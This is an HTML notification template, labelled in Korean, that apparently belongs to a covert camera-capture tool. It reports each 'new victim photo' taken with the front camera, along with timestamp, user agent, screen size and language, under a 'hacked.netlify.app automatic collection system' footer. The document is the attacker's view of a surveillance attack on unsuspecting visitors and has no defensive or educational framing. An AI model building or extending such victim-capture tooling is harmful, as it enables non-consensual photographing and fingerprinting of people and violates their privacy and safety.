<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>피해자 캡처 완료</title>
  <style>
    body { font-family: Arial, sans-serif; background:#0a0a0a; color:#00ff00; padding:20px; }
    h2 { color:#ff0000; text-align:center; }
    .info { background:#111; padding:15px; border:1px solid #00ff00; border-radius:5px; }
    img { max-width:100%; border:4px solid #ff0000; box-shadow:0 0 20px #00ff00; margin:20px 0; }
    .footer { font-size:0.8em; color:#555; text-align:center; margin-top:40px; }
  </style>
</head>
<body>

<h2>새로운 피해자 사진 도착</h2>

<div class="info">
  <p><strong>시간:</strong> {{timestamp}}</p>
  <p><strong>기기 정보:</strong> {{user_agent}}</p>
  <p><strong>화면 해상도:</strong> {{screen}}</p>
  <p><strong>언어:</strong> {{language}}</p>
</div>

<h3 style="color:#00ff00; margin-top:30px;">캡처된 전면 카메라 사진</h3>
<img src="{{image_base64}}" alt="Captured Victim Photo">

<div class="footer">
  hacked.netlify.app 자동 수집 시스템 • {{timestamp}}
</div>

</body>
</html>
